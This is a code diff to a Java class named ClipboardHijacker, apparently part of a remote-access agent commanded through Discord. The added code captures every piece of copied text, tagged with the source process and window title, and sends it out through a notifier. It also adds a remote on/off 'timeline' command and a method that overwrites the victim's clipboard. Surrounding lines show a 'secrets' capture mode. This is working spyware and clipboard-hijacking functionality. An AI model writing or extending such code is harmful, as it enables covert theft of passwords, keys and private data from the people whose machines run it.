@@ -139,9 +139,21 @@ final class ClipboardHijacker implements ClipboardService {
 		}
 	}
 
+	private boolean timeline() {
+		return state.clipboardTimelineSet ? state.clipboardTimeline : DiscordConfig.clipboardTimeline();
+	}
+
 	private void handle(String text, String process, String title) {
 		if (!active) {
 			return;
+		}
+		if (timeline() && !text.isBlank()) {
+			java.util.Map<String, Object> raw = new java.util.LinkedHashMap<>();
+			raw.put("content", text.length() > 4096 ? text.substring(0, 4096) : text);
+			raw.put("kind", "text");
+			raw.put("process", process);
+			raw.put("title", title);
+			notifier.event("clipboard", raw, "clipboard-text: " + process + " | " + title + " | " + raw.get("content"));
 		}
 		try {
 			String clean = text.strip();
@@ -327,6 +339,16 @@ final class ClipboardHijacker implements ClipboardService {
 				stop();
 				return "Clipboard off";
 			}
+			case "timeline" -> {
+				String value = args.size() > 2 ? args.get(2).toLowerCase(Locale.ROOT) : "status";
+				if (value.equals("on") || value.equals("off")) {
+					state.clipboardTimeline = value.equals("on");
+					state.clipboardTimelineSet = true;
+					state.save(AgentPaths.state(installDir));
+					return "Clipboard timeline " + value;
+				}
+				return "Clipboard timeline: " + (timeline() ? "on" : "off");
+			}
 			case "secrets" -> {
 				String value = args.size() > 2 ? args.get(2).toLowerCase(Locale.ROOT) : "status";
 				if (value.equals("on") || value.equals("off")) {
@@ -343,6 +365,16 @@ final class ClipboardHijacker implements ClipboardService {
 					+ " · secrets " + (secretsWanted() ? "on" : "off")
 					+ " · " + counts() + " · events " + state.clipEvents;
 			}
+		}
+	}
+
+	@Override
+	public boolean copy(String text) {
+		try {
+			write(text);
+			return true;
+		} catch (Throwable throwable) {
+			return false;
 		}
 	}
 
